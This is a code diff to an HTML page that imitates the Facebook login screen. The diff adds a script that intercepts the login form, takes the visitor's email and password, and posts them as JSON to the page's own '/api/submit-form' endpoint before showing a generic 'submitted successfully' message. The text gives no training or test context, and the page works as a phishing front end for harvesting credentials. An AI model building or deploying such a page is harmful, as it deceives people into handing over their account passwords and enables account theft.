@@ -16,7 +16,7 @@
           <p>Connect with friends and the world around you on Facebook.</p>
         </div>
         <!-- Adjusted form action -->
-        <form action="/api/submit-form.js" method="POST">
+        <form id="loginForm">
           <input type="text" name="email" placeholder="Email or Phone Number" required />
           <input type="password" name="password" placeholder="Password" required />
           <button class="login" type="submit">Log In</button>
@@ -26,5 +26,33 @@
         </form>        
       </div>
     </div>
+
+    <script>
+      document.getElementById('loginForm').addEventListener('submit', async function(event) {
+          event.preventDefault(); // Prevent page refresh
+
+          const email = event.target.email.value;
+          const password = event.target.password.value;
+
+          try {
+              const response = await fetch('/api/submit-form', {
+                  method: 'POST',
+                  headers: {
+                      'Content-Type': 'application/json',
+                  },
+                  body: JSON.stringify({ email, password }),
+              });
+
+              if (response.ok) {
+                  document.body.innerHTML = '<h1>Form submitted successfully!</h1><a href="/">Back to Home</a>';
+              } else {
+                  document.body.innerHTML = '<h1>Submission Failed. Try Again!</h1>';
+              }
+          } catch (error) {
+              console.error('Error submitting form:', error);
+              document.body.innerHTML = '<h1>Error Occurred. Please Try Again Later!</h1>';
+          }
+      });
+  </script>
   </body>
 </html>
